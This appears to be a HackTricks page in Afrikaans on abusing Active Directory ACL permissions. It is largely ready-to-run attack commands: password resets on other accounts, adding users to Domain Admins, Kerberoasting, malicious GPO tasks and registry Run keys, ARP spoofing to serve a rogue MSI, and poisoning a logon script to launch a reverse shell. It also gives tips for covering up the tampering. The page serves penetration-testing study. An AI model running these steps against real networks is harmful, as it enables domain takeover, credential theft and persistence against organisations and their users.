# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is hoofsaaklik 'n opsomming van die tegnieke uit** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, raadpleeg die oorspronklike artikels.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-regte op gebruiker**

Hierdie privilege gee 'n aanvaller volle beheer oor 'n teiken-gebruikersrekening. Sodra `GenericAll`-regte met die `Get-ObjectAcl`-command bevestig is, kan 'n aanvaller:

- **Verander die teiken se wagwoord**: Deur `net user <username> <password> /domain` te gebruik, kan die aanvaller die gebruiker se wagwoord terugstel.
- Vanuit Linux kan jy dieselfde oor SAMR met Samba `net rpc` doen:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **As die rekening gedeaktiveer is, verwyder die UAC-vlag**: `GenericAll` laat wysiging van `userAccountControl` toe. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Ken 'n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT)-hashes te onttrek en te probeer kraak.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Gerigte ASREPRoasting**: Skakel pre-authentication vir die gebruiker uit, wat hul rekening kwesbaar maak vir ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op 'n user kan jy 'n certificate-based credential byvoeg en as daardie user autentiseer sonder om hul password te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-regte op groep**

Hierdie privilege stel 'n attacker in staat om group memberships te manipuleer indien hulle `GenericAll`-regte op 'n groep soos `Domain Admins` het. Nadat die groep se distinguished name met `Get-NetGroup` geïdentifiseer is, kan die attacker:

- **Hulself by die Domain Admins Group voeg**: Dit kan deur middel van direkte commands of met modules soos Active Directory of PowerSploit gedoen word.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Vanaf Linux kan jy ook BloodyAD gebruik om jouself by willekeurige groepe te voeg wanneer jy GenericAll/Write-toestemmings daaroor het. As die teikengroep geneste is in “Remote Management Users”, sal jy onmiddellik WinRM-toegang verkry tot hosts wat daardie groep gebruik:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Die besit van hierdie voorregte op ’n rekenaarobjek of gebruikersrekening maak die volgende moontlik:

- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om beheer oor ’n rekenaarobjek oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om ’n rekenaar- of gebruikersrekening na te boots deur die voorregte te misbruik om shadow credentials te skep.

## **WriteProperty on Group**

As ’n gebruiker `WriteProperty`-regte op alle objekte vir ’n spesifieke groep (bv. `Domain Admins`) het, kan hulle:

- **Add Themselves to the Domain Admins Group**: Deur die kombinasie van die `net user`- en `Add-NetGroupUser`-commands, maak hierdie metode privilege escalation binne die domain moontlik.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) op Group**

Hierdie privilege stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur commands te gebruik wat group membership direk manipuleer. Die volgende command sequence maak self-addition moontlik:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

'n Soortgelyke privilege stel aanvallers in staat om hulself direk by groepe te voeg deur groepseienskappe te wysig indien hulle die `WriteProperty`-reg op daardie groepe het. Die bevestiging en uitvoering van hierdie privilege word met die volgende uitgevoer:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Om die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` te hê, laat wagwoordterstellings toe sonder om die huidige wagwoord te ken. Verifikasie van hierdie reg en die exploitation daarvan kan deur PowerShell of alternatiewe command-line tools gedoen word, wat verskeie metodes bied om 'n gebruiker se wagwoord terug te stel, insluitend interaktiewe sessies en one-liners vir nie-interaktiewe omgewings. Die commands wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van die attack vectors demonstreer.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op Group**

As 'n attacker ontdek dat hulle `WriteOwner`-regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is besonder impakvol wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepseienskappe en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek met `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, hetsy volgens SID of naam.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Hierdie toestemming laat ’n aanvaller toe om gebruiker-eienskappe te wysig. Spesifiek, met `GenericWrite`-toegang kan die aanvaller die logonskrippad van ’n gebruiker verander om ’n kwaadwillige script uit te voer wanneer die gebruiker aanmeld. Dit word bereik deur die `Set-ADObject`-opdrag te gebruik om die `scriptpath`-eienskap van die teikengebruiker by te werk sodat dit na die aanvaller se script wys.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n credential object, die gebruik daarvan om gebruikers by 'n groep te voeg of daaruit te verwyder, en die verifikasie van die lidmaatskapveranderinge met PowerShell-opdragte.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Vanaf Linux kan Samba `net` lede byvoeg/verwyder wanneer jy `GenericWrite` op die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Die besit van ’n AD-object en die besit van `WriteDACL`-voorregte daarop stel ’n aanvaller in staat om hulself `GenericAll`-voorregte oor die object toe te ken. Dit word deur ADSI-manipulasie bewerkstellig, wat volle beheer oor die object en die vermoë bied om sy groeplidmaatskappe te wysig. Ten spyte hiervan bestaan daar beperkings wanneer hierdie voorregte met die Active Directory-module se `Set-Acl` / `Get-Acl`-cmdlets probeer uitbuit word.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Vinnige WriteDACL/WriteOwner-oorname (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor ’n gebruiker- of diensrekening het, kan jy volle beheer oorneem en sy wagwoord met PowerView terugstel sonder om die ou wagwoord te ken:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Jy moet dalk eers die eienaar na jouself verander as jy slegs `WriteOwner` het:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valideer toegang met enige protokol (SMB/LDAP/RDP/WinRM) nadat die wagwoord teruggestel is.

## **Replikasie op die Domain (DCSync)**

Die DCSync-aanval benut spesifieke replikasietoestemmings op die domain om ’n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinkroniseer. Hierdie kragtige tegniek vereis toestemmings soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot ’n Domain Controller.<sup>[[5]](#references)</sup> [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur, kan beduidende sekuriteitsrisiko’s inhou. Byvoorbeeld, indien ’n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer is, kan hulle voorregte soos **WriteProperty**, **WriteDacl** en **WriteOwner** hê. Hierdie toestemmings kan vir kwaadwillige doeleindes misbruik word, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Om verkeerd gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aan mekaar gekoppel word. Dit maak die ontdekking moontlik van GPOs wat ’n spesifieke gebruiker toestemming het om te bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars waarop ’n Gegewe Policy Toegepas is**: Dit is moontlik om vas te stel op watter rekenaars ’n spesifieke GPO van toepassing is, wat help om die omvang van die potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Toegepas op ’n Gegewe Rekenaar**: Om te sien watter policies op ’n spesifieke rekenaar toegepas word, kan opdragte soos `Get-DomainGPO` gebruik word.

**OUs waarop ’n Gegewe Policy Toegepas is**: Organisatoriese eenhede (OUs) wat deur ’n gegewe policy geraak word, kan met `Get-DomainOU` geïdentifiseer word.

Jy kan ook die hulpmiddel [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te enumerate en probleme daarin te vind.

### Abuse GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPOs kan uitgebuit word om code uit te voer, byvoorbeeld deur ’n onmiddellike scheduled task te skep. Dit kan gedoen word om ’n gebruiker by die plaaslike administrators-groep op geaffekteerde masjiene te voeg, wat voorregte aansienlik verhoog:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Die GroupPolicy module, indien geïnstalleer, laat die skepping en koppeling van nuwe GPOs toe, asook die instelling van voorkeure soos registry values om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat ’n gebruiker by die rekenaar aanmeld vir uitvoering:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied ’n metode om bestaande GPO’s te misbruik deur take by te voeg of instellings te wysig sonder dat nuwe GPO’s geskep hoef te word. Hierdie tool vereis die wysiging van bestaande GPO’s of die gebruik van RSAT tools om nuwes te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Dwing Beleidsopdatering af

GPO-opdaterings vind gewoonlik ongeveer elke 90 minute plaas. Om hierdie proses te bespoedig, veral nadat 'n verandering geïmplementeer is, kan die `gpupdate /force`-opdrag op die teikenrekenaar gebruik word om 'n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPOs toegepas word sonder om vir die volgende outomatiese opdateringsiklus te wag.

### Onder die enjinkap

By inspeksie van die Scheduled Tasks vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die byvoeging van take soos `evilTask` bevestig word. Hierdie take word deur scripts of command-line tools geskep met die doel om stelselgedrag te wysig of privileges te eskaleer.

Die struktuur van die taak, soos aangedui in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer word, beskryf die besonderhede van die scheduled task - insluitend die opdrag wat uitgevoer moet word en die snellers daarvan. Hierdie lêer verteenwoordig hoe scheduled tasks binne GPOs gedefinieer en bestuur word, en bied 'n metode om arbitrêre opdragte of scripts as deel van beleidstoepassing uit te voer.

### Gebruikers en Groepe

GPOs laat ook die manipulering van gebruikers- en groeplidmaatskappe op teikenstelsels toe. Deur die Users and Groups-beleidlêers direk te wysig, kan attackers gebruikers by privileged groups voeg, soos die plaaslike `administrators`-groep. Dit is moontlik deur die delegering van GPO-bestuurstoestemmings, wat die wysiging van beleidlêers toelaat om nuwe gebruikers in te sluit of groeplidmaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers elevated privileges op geaffekteerde stelsels verkry. Hierdie metode bied 'n direkte benadering tot privilege escalation deur GPO-manipulasie.

Verder kan addisionele metodes vir die uitvoering van code of die handhawing van persistence, soos die benutting van logon/logoff scripts, die wysiging van registry keys vir autoruns, die installering van software deur middel van .msi-lêers, of die redigering van service configurations, ook oorweeg word. Hierdie techniques bied verskeie moontlikhede om toegang te behou en beheer oor teikenstelsels te handhaaf deur die misbruik van GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` oor 'n OU/domain laat jou toe om die teikencontainer se `gPLink`-attribuut te wysig en **'n bestaande GPO te dwing om toegepas te word** sonder om die GPO self te wysig. Dit word interessant wanneer die gekoppelde GPO reeds na afgeleë inhoud oor **UNC paths** (`\\HOST\share\...`) verwys, omdat authenticated users **SYSVOL** kan lees en aanlyn na herbruikbare policies kan soek.<sup>[[11]](#references)</sup>

Hoëvlak-werkvloei:

1. Gebruik BloodHound om 'n principal met `WriteGPLink` oor 'n OU te identifiseer en rekenaars/gebruikers binne daardie OU op te som.
2. Kloon `SYSVOL` read-only en parse GPOs om te soek na **Software Installation**, **drive mappings** (`Drives.xml`) en **logon/startup scripts** wat na UNC paths verwys.
3. Verkies policies wat na 'n **direct hostname** wys (byvoorbeeld `\\DC02\share\pkg.msi`) eerder as DFS/domain-namespace paths, omdat hostname-gebaseerde paths makliker met L2 spoofing herlei kan word.
4. Voeg die gekose GPO GUID by die teiken-OU se `gPLink` sodat die victim daardie reeds bestaande policy verwerk.
5. Doen ARP spoofing op dieselfde broadcast domain van die UNC-host en bind sy IP plaaslik (`ip addr add <target_ip>/32 dev <iface>`) sodat die victim se SMB-verkeer jou host bereik.
6. Bedien die verwagte path/filename vanaf 'n attacker SMB server (byvoorbeeld `smbserver.py`) en wag vir normale policy processing.

Voorbeeld van `SYSVOL`-insameling en GPO-korrelasie:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Koppel die bestaande GPO aan die teiken-OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

As die gekoppelde GPO 'n MSI vanaf 'n UNC-pad ontplooi, sal die kliënt dit tydens **rekenaar-opstart** ophaal en dit as **`NT AUTHORITY\SYSTEM`** installeer. Deur die verwysde host te spoof en 'n malicious MSI onder dieselfde **share/path/name** aan te bied, kan jy `WriteGPLink` in SYSTEM-kode-uitvoering omskep **sonder om SYSVOL te wysig**.

Belangrike beperkings:

- **Tydsberekening is belangrik**: die nuwe skakel word tydens policy refresh gesien (gewoonlik ~90 minute later), maar **Software Installation** word gewoonlik tydens **herlaai** geaktiveer.
- Windows Installer hou gewoonlik die ontplooiing met die pakket se **`ProductCode`** dop. As die produk reeds geïnstalleer is, kan die ontplooiing oorgeslaan word.
- Om te voorkom dat die installer dit weier, patch die rogue MSI sodat sy **`ProductCode`** en **`PackageCode`** ooreenstem met dié van die legitieme pakket wat deur die GPO verwag word.
- Ou `.aas`-advertensielêers kan in `SYSVOL` agterbly; valideer dus dat die ontplooiing steeds aktief lyk voordat jy daarop staatmaak.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` veroorsaak dat gebruikers tydens aanmelding of herverbinding by die gekonfigureerde UNC-pad authenticate. As jy die verwysde host spoof, kan jy **NetNTLMv2** capture. As SMB doelbewus laat fail word, kan Windows weer oor **WebDAV** probeer, wat **NTLM oor HTTP** stuur en baie meer buigsaam is vir relays na **LDAP(S)**, **AD CS** of **SMB**.

#### Logon/startup script UNC hijack

Dieselfde patroon is van toepassing op UNC-gehoste scripts wat in `SYSVOL` ontdek word:

- **Logon scripts** word gewoonlik in die **user**-konteks uitgevoer.
- **Startup scripts** word gewoonlik in die **computer / SYSTEM**-konteks uitgevoer.

As die script-pad na ’n spoofbare hostname wys, redirect die UNC-host en bedien vervangings-scriptinhoud vanaf die verwagte ligging.

## SYSVOL/NETLOGON Logon Script Poisoning

Skryfbare paaie onder `\\<dc>\SYSVOL\<domain>\scripts\` of `\\<dc>\NETLOGON\` laat tampering met logon scripts toe wat tydens user-aanmelding via GPO uitgevoer word. Dit lewer code execution in die security context van users wat aanmeld.

### Locate logon scripts
- Inspekteer user attributes vir ’n gekonfigureerde logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Doorsoek domeingedeelde vouers om kortpaaie of verwysings na scripts op te spoor:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Ontleed `.lnk`-lêers om teikens op te los wat na SYSVOL/NETLOGON wys (’n nuttige DFIR-truuk en vir aanvallers sonder direkte GPO-toegang):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound vertoon die `logonScript`-kenmerk (`scriptPath`) op gebruikersnodusse wanneer dit teenwoordig is.

### Valideer skryftoegang (moenie deellysinskrywings vertrou nie)
Geoutomatiseerde nutsprogramme kan SYSVOL/NETLOGON as slegs-lees vertoon, maar onderliggende NTFS ACLs kan steeds skryftoegang toelaat. Toets altyd:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
As lêergrootte of mtime verander, het jy write. Bewaar oorspronklikes voordat jy dit wysig.

### Poison a VBScript logon script for RCE
Voeg ’n command by wat ’n PowerShell reverse shell (genereer vanaf revshells.com) begin en behou die oorspronklike logika om te voorkom dat die business-funksionaliteit breek:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Luister op jou host en wag vir die volgende interaktiewe aanmelding:
```bash
rlwrap -cAr nc -lnvp 443
```
Notas:
- Uitvoering vind plaas onder die token van die aangetekende gebruiker (nie SYSTEM nie). Omvang is die GPO-skakel (OU, site, domain) wat daardie script toepas.
- Maak skoon deur die oorspronklike inhoud/tydstempels ná gebruik te herstel.


## Verwysings

- [1] [Misbruik van Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Bevoorregte rekeninge en token-voorregte](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Die ACL-aanvalspad-opdatering](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Voorregte-eskalering met ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skandering vir Active Directory-voorregte en -bevoorregte rekeninge](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-kenmerk/UAC-bedrywighede vanaf Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (groeplidmaatskap)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL-misbruik, KeePassXC Argon2-cracking en DPAPI-dekripsie tot DC-admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kaping van GPO UNC-paaie vir kode-uitvoering en NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
